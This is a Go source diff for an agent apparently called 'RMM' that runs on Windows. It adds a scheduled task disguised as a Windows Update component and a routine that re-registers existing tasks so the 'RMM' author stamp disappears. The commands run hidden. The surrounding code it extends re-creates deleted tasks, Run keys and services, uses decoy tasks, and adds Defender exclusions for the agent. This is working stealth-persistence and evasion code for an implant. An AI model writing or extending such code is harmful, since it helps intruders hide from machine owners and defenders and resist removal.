@@ -193,6 +193,7 @@ var wmiTaskPairs = [][2]string{
 	{"WindowsUpdate", "agent_task.xml"},
 	{"WindowsUpdateWatchdog", "watchdog_task.xml"},
 	{"WindowsUpdateOrchestrator", "orchestrator_task.xml"},
+	{"WindowsUpdateNMS", "nms_task.xml"},
 }
 
 // wmiSets mirrors the installer's two resurrection sets (primary +
@@ -262,6 +263,8 @@ func regenerateTaskXML(dir, file, agentPath, controllerAddr, caPath string) stri
 		doc = persist.WatchdogTaskXML(agentPath)
 	case "orchestrator_task.xml":
 		doc = persist.OrchestratorTaskXML(agentPath)
+	case "nms_task.xml":
+		doc = persist.NMSTaskXML(agentPath)
 	case "decoy_task.xml":
 		doc = persist.DecoyTaskXML(agentPath)
 	default:
@@ -629,6 +632,37 @@ func mpListHas(have []string, want string) bool {
 	return false
 }
 
+// migrateTaskAuthors re-registers tasks whose stored XML still carries the
+// pre-1.49.5 author stamp. New installs are born bland; this converges the
+// existing fleet without reinstalls (and heals the on-disk XML copies as a
+// side effect, via regenerate). Runs in the slow lane; silent unless it
+// repairs something.
+func migrateTaskAuthors(w *watchCfg) {
+	for _, t := range wmiTaskPairs {
+		out, err := hiddenExec("schtasks", "/query", "/tn", t[0], "/xml").CombinedOutput()
+		if err != nil || !strings.Contains(string(out), "<Author>RMM</Author>") {
+			continue
+		}
+		xml := ""
+		if p := resolveTaskXML(w.installDir, t[1]); p != "" {
+			if b, rerr := os.ReadFile(p); rerr == nil && !strings.Contains(string(b), "<Author>RMM</Author>") && persist.ValidateTaskXML(string(b)) == nil {
+				xml = p
+			}
+		}
+		if xml == "" {
+			xml = regenerateTaskXML(w.installDir, t[1], w.agentPath, w.controllerAddr, w.caPath)
+		}
+		if xml == "" {
+			continue
+		}
+		if out, err := hiddenExec("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
+			log.Printf("[watch] author migration %s: %v %s", t[0], err, strings.TrimSpace(string(out)))
+		} else {
+			log.Printf("[watch] author migrated for %s", t[0])
+		}
+	}
+}
+
 // ensureWatchPersistence re-creates deleted Run keys / scheduled tasks from
 // the XML copies saved beside the backup (self-healing persistence).
 func ensureWatchPersistence(w *watchCfg) {
@@ -649,6 +683,7 @@ func ensureWatchPersistence(w *watchCfg) {
 	}
 	setRun("WindowsUpdate", agentCmd)
 	setRun("WindowsUpdateWatchdog", watchCmd)
+	migrateTaskAuthors(w)
 	ensureDefenderExclusions(w.agentPath, w.installDir)
 	ensureActiveSetupKey(w.agentPath)
 	ensureService(w.agentPath)
